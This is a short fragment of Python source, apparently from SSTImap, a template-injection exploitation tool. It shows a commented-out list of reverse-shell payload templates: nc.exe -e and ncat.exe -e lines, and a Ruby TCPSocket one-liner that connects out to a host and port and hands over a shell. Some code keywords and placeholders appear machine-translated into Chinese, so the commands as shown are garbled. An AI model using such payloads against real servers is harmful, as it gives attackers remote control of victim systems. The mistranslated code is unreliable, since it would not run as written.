...
reverse_shell = [
    ...
    # """睡眠 1; nc.exe -e SSTImap:shell; SSTImap:主机; SSTImap:端口;""",
    # """睡眠 1; ncat.exe -e SSTImap:shell; SSTImap:主机; SSTImap:端口;""",
    ...
    # TODO：ruby 载荷已损坏，请修复它。
    # """ruby -rsocket -e'f=TCPSocket.open("SSTImap:主机;",SSTImap:端口;).to_i;exec sprintf("SSTImap:shell; -i <&%d >&%d 2>&%d",f,f,f)'""",
